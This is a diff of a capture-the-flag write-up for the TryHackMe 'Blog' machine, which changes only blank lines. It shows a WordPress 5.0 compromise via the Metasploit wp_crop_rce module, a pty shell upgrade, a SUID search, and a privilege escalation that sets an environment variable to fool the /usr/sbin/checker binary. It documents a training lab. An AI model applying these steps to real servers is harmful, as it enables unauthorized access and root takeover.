@@ -109,10 +109,13 @@ log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-ad
 EXPLOITATION
 =============
 goal is to upload a php revere shell and get in .
+
 no plugins or themes options in the page :( .
+
 let's try metasploit module .
 
 multi/http/wp_crop_rce  # fits the wordpress 5.0 rce .
+
 ### set password ,username , rhost= blog.thm ,lhost  then exploit .
 
 
@@ -121,9 +124,13 @@ multi/http/wp_crop_rce  # fits the wordpress 5.0 rce .
 Server username: www-data (33)
 
 to get a stable shell :
+
 $shell
+
 $python -c "import pty ; pty.spawn('/bin/bash')"
+
 [*]seaching for user.txt
+
 /home/bjoel/user.txt
 ```
 You won't find what you're looking for here.
@@ -149,17 +156,21 @@ we need our password so not helpful .
 $find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null
 
 let's check this :
--rwsr-xr-x 1 root root            136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo#need password
+
+-rwsr-xr-x 1 root root            136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo     #need password
+
 -rwsr-sr-x 1 root root              8432 May 26  2020 /usr/sbin/checker
 
 https://gtfobins.github.io/#checker #no results :(
 
 try to run it 
 /usr/sbin/checker
+
 Not an Admin
 
 linpeas
 ========
+
 on my side :
 -------------
 (kali㉿kali)-[~/Tryhackme/blog/linpeas]
@@ -183,7 +194,9 @@ cutter results :
 ![cutter](https://user-images.githubusercontent.com/67979878/126591875-65cf2723-f362-4e08-82fc-b60e690c2717.PNG)
 
 we can see it checks in /bin/bash if varirable admin is not 0x00 . 
+
 so let's try set value before executing it  .
+
 $export admin=admin
 
 $/usr/sbin/checker 
